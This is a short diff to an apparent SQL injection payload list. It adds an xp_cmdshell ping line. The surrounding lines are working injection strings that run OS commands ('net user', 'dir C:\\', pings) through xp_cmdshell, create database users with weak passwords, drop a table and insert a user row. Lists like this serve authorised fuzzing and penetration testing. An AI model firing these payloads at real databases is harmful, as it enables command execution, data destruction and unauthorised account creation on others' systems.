@@ -1,4 +1,5 @@
 '; exec master..xp_cmdshell 'ping 10.10.1.2'--
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
 create user name identified by 'pass123'
 create user name identified by pass123 temporary tablespace temp default tablespace users; 
 ' ; drop table temp --
@@ -12,4 +13,3 @@ insert into users(login, password, level) values( char(0x70) + char(0x65) + char
 '; EXEC master..xp_cmdshell 'net user'-- 
 '; EXEC master..xp_cmdshell 'ping 10.0.0.1'-- 
 '; EXEC master..xp_cmdshell 'dir C:\'-- 
-
